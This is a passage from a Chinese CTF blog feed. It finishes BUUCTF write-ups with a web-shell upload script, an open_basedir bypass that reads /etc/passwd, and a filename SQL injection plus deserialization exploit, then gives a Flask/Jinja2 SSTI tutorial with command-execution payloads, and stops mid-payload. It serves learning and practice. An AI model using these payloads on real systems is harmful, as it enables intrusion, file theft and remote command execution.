operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span><span class="token string">"Submit"</span><span class="token punctuation">}</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'shell.ppp'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>+++</p><p>上面就是wp的python脚本，这里其实也大可不必脚本，只要手速够快，在REMOTE_ADDR变换前写入两个文件即可</p><p>其中在htaccess文件里加注释绕过我一直不懂，有人说是#截断让行无效化</p><p>但经过测试，应该是用#define width 1337和#define height 1337伪造了图片的宽和高，使服务器认为这是一个图片</p><p> <img src="image-20211105131407883.png" alt="image-20211105131407883"></p><h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><p>参考文章<code>https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/</code></p><p>之前分析过原理，不过时间有点久，我也忘了，这次直接贴payload</p><pre class="line-numbers language-payload"><code class="language-payload">chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system('ls');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">原理：<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'Von'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个目录Von</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'Von'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//切换到Von目录下</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//把open_basedir切换到上层目录</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//以下是把目录切换到根目录</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置open_basedir为根目录(此时相当于没有设置open_basedir)</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//读取/etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p><img src="image-20211105132512541.png" alt="image-20211105132512541"></p><pre class="line-numbers language-flag"><code class="language-flag">flag{88f35866-46d9-47ed-9b58-fc7d23bf23a8}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>提一句题外话，算是又感而发</p><p>任何漏洞的产生，不是我们理所当然的认为该这样所以是这样</p><p>就好像这道题#define 伪造宽高，chdir(‘..’);过open_basedir，不是可以伪造宽高和执行cd导致漏洞 </p><p>而是底层代码的逻辑出现了问题，让我们可以伪造宽高和执行cd</p><p>代码审计，是安全的根本</p></blockquote><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>解法同EasyWeb文件上传部分，我不想重复写</p><p>难题虽难，但果然很有意思，学到不少东西</p><h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{7b0d8cdf-ef59-4a48-990a-ef2155c66d77}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>有意思的一道题目</p><p>虽然我之前就听说过文件名sql注入这个东西，但从另一种角度看，这道题算是我自己审计出漏洞的第一题</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>第一个考点很偏门，但我好像也不是很意外，学安全哪有不会信息收集的，从这个角度看，这考点还蛮不错的</p><p><img src="image-20211106102652460.png" alt="image-20211106102652460"></p><p>去github搜即可得到源码</p><h3 id="审计-反序列化"><a href="#审计-反序列化" class="headerlink" title="审计-反序列化"></a>审计-反序列化</h3><p>首先源码里可以找到一个很明显的反序列化任意文件读取</p><p><img src="image-20211106102913745.png" alt="image-20211106102913745"></p><p>接着看看有没有利用点</p><p><img src="image-20211106103050186.png" alt="image-20211106103050186"></p><p><img src="image-20211106103108514.png" alt="image-20211106103108514"></p><p>发现在上传图片时程序会将图片的宽高序列化，然后在显示图片时序列化</p><p>所以下一个目标就是让序列化的宽高成为构造好的序列化exp</p><h3 id="审计-文件名sql注入"><a href="#审计-文件名sql注入" class="headerlink" title="审计-文件名sql注入"></a>审计-文件名sql注入</h3><p>伪造宽高显然不现实，好在这里还有个sql注入</p><p><img src="image-20211106103607479.png" alt="image-20211106103607479"></p><p>这个点是调试出来的，同时可知$sql_val一共有四个值，第四个即为序列化的宽高</p><p>同样，也可以得到文件名不变的结论，即程序对文件名没有任意的处理</p><p>这里我已经把调试关了所以不贴截图，如果真有人想探究一下原理，不妨去自己调试一下</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/* * 只能说这题蛮有趣的 * 思路: * 文件上传，需要控制文件上传的宽高的序列化 * 在显示图片处反序列化，造成任意文件读取 * 这里宽高实在太难控制，所以需要用sql注入给数据库里注进去 * 调试之后发现，可以用文件名进行注入操作 * 其中调试后得知写入的数据格式如下 * VALUES('1','47e345731fb1eefb.gif','gif','pic/47e345731fb1eefb.gif','a:2:{s:5:"width";i:12849;s:6:"height";i:8224;}') * 理清思路，顿感简单，先写个反序列化 * 写完就下面两句，真勾八简单 * 然后构造注入语句 * 9','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a34393a227068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d2f666c6167223b7d)#')# * */</span><span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=/flag";</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"9','1','1','1',0x"</span><span class="token punctuation">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">")#"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211106104318925.png" alt="image-20211106104318925"></p><p><img src="image-20211106104338067.png" alt="image-20211106104338067"></p><h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{d89dae12-80eb-4972-980d-261858d14dd0}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这道题的审计真的很简单，但它的利用思路，真的很好玩</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>BUU2 就到这吧</p><p>截止2021.11.06，我零零散散刷的这些题，又写了6000字</p><p>期间也就偶尔刷一刷，算不得有多快的刷题速度，也好在最近学长整理了一份题目难度表，顺便去除了纯属恶心人的题目，我可算是感觉刷的每到题都能让我学到东西了</p><p>说真的，有时我感觉自己的博客不是笔记，而是小说，而且大概连我自己都不会去看，学安全扑街，写作也扑街，生活也是个扑街</p><p>感觉我现在整个人就是个三无产品，没钱没技术还没女朋友</p><p>吐槽结束，上面纯当乐子看就行，也就我博客没人看，所以这么写写，浏览量高了我不得分分钟把这话删了</p><p>接下来刷的题，我会写进BUU3</p><p>希望接下来我不看wp也可以自己做出来</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI学习记录</title>
      <link href="/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI基础"><a href="#SSTI基础" class="headerlink" title="SSTI基础"></a>SSTI基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>每个模板都是大致类似却各有区别的，上个模版注入的内容不一定适用于下一个模板，最有效的注入方法除了网上百度各大师傅的文章，就只有查阅帮助文档</p><h2 id="简介与原理"><a href="#简介与原理" class="headerlink" title="简介与原理"></a>简介与原理</h2><p>我们在写项目时，为了方便且简单实现界面数据分离，业务逻辑分离，通常使用模板来实现</p><p>模板定义了在前端调用后端数据的方法，最常见的就是</p><p>当服务端没有对用户的输出进行处理时，一但用户输入了符合条件的命令，就会造成模板注入，这点几乎是所有注入所共通的地方</p><p>我们称这个漏洞为SSTI，也叫沙盒逃逸</p><h2 id="模板框架"><a href="#模板框架" class="headerlink" title="模板框架"></a>模板框架</h2><p><img src="https://p5.ssl.qhimg.com/t01f4792c7d03dd49cc.png" alt="img"></p><h2 id="基本的测试方法："><a href="#基本的测试方法：" class="headerlink" title="基本的测试方法："></a>基本的测试方法：</h2><p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwNTEyMTcyNDM1OTgxLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3dhdGVybWFyayx0eXBlX1ptRnVaM3BvWlc1bmFHVnBkR2ssc2hhZG93XzEwLHRleHRfYUhSMGNITTZMeTlpYkc5bkxtTnpaRzR1Ym1WMEwzRnhYelF4TmpJNE5qWTUsc2l6ZV8xNixjb2xvcl9GRkZGRkYsdF83MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说7*’7’会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p><h1 id="FlaskSSti"><a href="#FlaskSSti" class="headerlink" title="FlaskSSti"></a>FlaskSSti</h1><p><strong>基于python的模板引擎</strong></p><h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><p>在我们没有启动一个python解释器时，即使没有创建任何的变量和函数，仍然有很多函数可以调用，我们称之为内建函数</p><p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p><p>名称空间在python是个非常重要的概念，它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间</p><blockquote><p>内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字</p><p>全局名称空间：在执行文件时，存放文件级别定义的名字</p><p>局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效</p></blockquote><pre><code>加载顺序：内置名称空间------&gt;全局名称空间-----&gt;局部名称空间名字的查找顺序：局部名称空间------&gt;全局名称空间-----&gt;内置名称空间</code></pre><p>在python中运行dir()，我们可以看到这些内置的函数</p><p><img src="image-20210608144616955.png" alt="image-20210608144616955"></p><p>可以看到，str,zip,ascii都在其中</p><h4 id="内建属性"><a href="#内建属性" class="headerlink" title="内建属性"></a>内建属性</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token number">1.</span>__class__ ：    __class__功能和type<span class="token punctuation">(</span><span class="token punctuation">)</span>函数一样，都是查看对象所在的类。    __class__可以套用    例如：<span class="token string">""</span><span class="token punctuation">.</span>__class__ <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span>     或者 a <span class="token operator">=</span> <span class="token number">123</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>    <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token number">2.</span>__bases__ <span class="token punctuation">:</span>       __bases__属性可以获取对象的基类      该属性返回所有直接父类组成的元组。注意是直接父类！！！    使用语法：类名<span class="token punctuation">.</span>bases<span class="token punctuation">,</span>常配合__class__使用    例如：<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__ <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span>    这里返回的便是str类的父类object<span class="token punctuation">,</span>object也是python所有函数的基类<span class="token number">3.</span>__mro__ <span class="token punctuation">:</span>     __mro__属性获取整个类的继承关系，返回内容是一个列表    当使用__bases__无法获取基类object时，使用__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>即可得到基类object<span class="token number">4.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>    __subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>函数获取基于此父类下的所有子类    __subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>返回一个列表    例如：a<span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span>    这里返回了基于int类的所有子类，如果我们想得到object的子类，只需定位到该类即可    <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>    这也是类继承的原理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210608154150096.png" alt="image-20210608154150096"></p><h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><p>python中对一个变量应用<strong>class</strong>方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法</p><pre class="line-numbers language-python"><code class="language-python">__bases__ <span class="token operator">//</span>对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法__mro__ <span class="token operator">//</span>同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>可以获取到__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>继承此对象的子类，返回一个列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类啦。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><h4 id="int-，-new-和-call"><a href="#int-，-new-和-call" class="headerlink" title="__int__，__new__和__call__"></a><code>__int__</code>，<code>__new__</code>和<code>__call__</code></h4><p>这三个魔术方法都是用来定义一个类，用得最多的就是 <code>__init__</code> 方法，而 <code>__new__</code> 和 <code>__call__</code> 使用得比较少</p><pre class="line-numbers language-python"><code class="language-python"><span class="token number">1.</span>__init__ ：    __init__方法负责对象的初始化    可以方便地自己对类的属性进行定义，__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>方法又被称为构造器    当实例对象创建完成后被调用，然后设置对象属性的一些初始值。<span class="token number">2.</span>__new__ <span class="token punctuation">:</span>    在实例创建之前被调用，它的任务就是创建实例然后返回该实例    是个静态方法。<span class="token number">3.</span>__call__ <span class="token punctuation">:</span>    将一个类实例变成一个可调用对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在定位到基类的子类后，可以用这三个方法调用那个类</p><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>这个方法用于查找所有的方法及变量与参数</p><h2 id="SSTI实现方法"><a href="#SSTI实现方法" class="headerlink" title="SSTI实现方法"></a>SSTI实现方法</h2><p>了解了上面这些内置函数和魔术函数，可能有些师傅已经明白SSTI的实现方法了</p><p>这里以python 的莫模板注入为例，实际上所有的ssti原理都大致相通</p><p>当我们实现一个操作时，即使这个操作非常的简单，python都是从一个基类开始向上进行类的调用，最终实现一个简单的操作</p><p>python中所有类默认继承object类，而object类提供了了很多原始的内建属性和方法，所以用户自定义的类在Python中也会继承这些内建属性。</p><p>这个上面已经提到</p><p>当我们使用上述的内置属性和魔术方法定位至可以执行命令的类时，使用<code>__init__</code>将其调用，然后找到利用点，传入参数利用</p><p>这样就实现了ssti模板注入的攻击</p><h2 id="注入示例及分析"><a href="#注入示例及分析" class="headerlink" title="注入示例及分析"></a>注入示例及分析</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    template <span class="token operator">=</span> <span class="token string">"&lt;h1>%s&lt;/h1>"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>传入<code>&#39;&#39;.__class__</code></p><p>  <img src="image-20210608165753261.png" alt="image-20210608165753261"></p></li><li><p>得到python基类</p><p>  <code>?id=&#39;&#39;.__class__.__bases__</code></p><p>  <img src="image-20210608170011223.png" alt="image-20210608170011223"></p></li><li><p>查看此程序所有使用的子类</p><p>  <code>?id=&#39;&#39;.__class__.__bases__[0].__subclasses__()</code></p><p>  <img src="image-20210608170317839.png" alt="image-20210608170317839"></p></li><li><p>找到可以执行命令的类</p><p>  <code>?id=&#39;&#39;.__class__.__bases__[0].__subclasses__()[118]</code></p><p>  <img src="image-20210608170647445.png" alt="image-20210608170647445"></p></li></ul><h3 id="os库"><a href="#os库" class="headerlink" title="os库"></a>os库</h3><p>os 库用于操作和处理文件</p><p>os库中提供了可以执行命令的函数</p><p>例如：</p><pre class="line-numbers language-python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h4><p>用法：os.popen(command[,mode[,bufsize]])</p><p>说明：<strong>mode</strong> – 模式权限可以是 ‘r’(默认) 或 ‘w’。</p><p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。</p><p><img src="image-20210608214104059.png" alt="image-20210608214104059"></p><p>可以看到我们用read()可以把结果回显。</p><pre class="line-numbers language-python"><code class="language-python">?id <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>或者?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system()"></a>os.system()</h4><p>用法：os.system(command)</p><p>这个调用相当直接，且是同步进行的，程序需要<strong>阻塞</strong>并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值。</p><p>注意：该函数返回命令<strong>执行结果的返回值</strong>，并不是返回命令的执行输出（执行成功返回0，失败返回-1）</p><p><img src="image-20210608214231963.png" alt="image-20210608214231963"></p><h3 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h3><p>subprocess 模块有比较多的功能，subprocess模块被推荐用来替换一些老的模块和函数，如：os.system、os.spawn、os.popen等</p><p>subprocess模块目的是<strong>启动一个新的进程并与之通信</strong>。这里只讲用来运行shell命令的两个常用方法。</p><p><img src="image-20210608215903861.png" alt="image-20210608215903861"></p><pre class="line-numbers language-python"><code class="language-python">?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">376</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="subprocess-call-“command”"><a href="#subprocess-call-“command”" class="headerlink" title="subprocess.call(“command”)"></a><strong>subprocess.call(“command”)</strong></h4><p>父进程等待子进程完成<br>返回退出信息(returncode，相当于Linux exit code)</p><p>与os.system功能相似,也无执行结果的回显</p><h4 id="subprocess-Popen-“command”"><a href="#subprocess-Popen-“command”" class="headerlink" title="subprocess.Popen(“command”)"></a><strong>subprocess.Popen(“command”)</strong></h4><p>说明：<code>class subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)</code></p><p>Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，<strong>它是一个阻塞的方法</strong>，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，<strong>Popen方法也不会打印出cmd的执行信息</strong>。</p><h3 id="操作思路"><a href="#操作思路" class="headerlink" title="操作思路"></a>操作思路</h3><p>SSTI考验的对代码的熟悉，能快速找到可执行的代码，就可以实现我们的目地</p><p>举个例子</p><p>现在我们找到了所有的函数，假设我们知道文件的路径</p><pre><code>D:\phpstudy_pro\WWW\ssti\ls.py</code></pre><p><img src="image-20210609162844096.png" alt="image-20210609162844096"></p><p>在os模块下，我们找到了rename函数，尝试调用它</p><pre class="line-numbers language-python"><code class="language-python">?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'renames'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'D://phpstudy_pro//WWW//ssti//ls.py'</span><span class="token punctuation">,</span><span class="token string">'D://phpstudy_pro//WWW//ssti//测试一下修改成果.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210609162954488.png" alt="image-20210609162954488"></p><p>成功</p><p>所以SSTI的思路简单总结下来就是：</p><ul><li>找到注入点</li><li>定位到任一父类</li><li>找到基于当前父类，可以实现我们目的的子类</li><li><code>__init__</code>调用此类，<code>__globals__</code>查找函数和方法</li><li>调用函数或方法，执行我们想要执行的命令</li></ul><p>其中查看子类事往往有很多结果，甚至没有回显</p><p>这时使用执行语句来查找，如上面的重命名就可以用命令执行：</p><pre class="line-numbers language-python"><code class="language-python">?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span 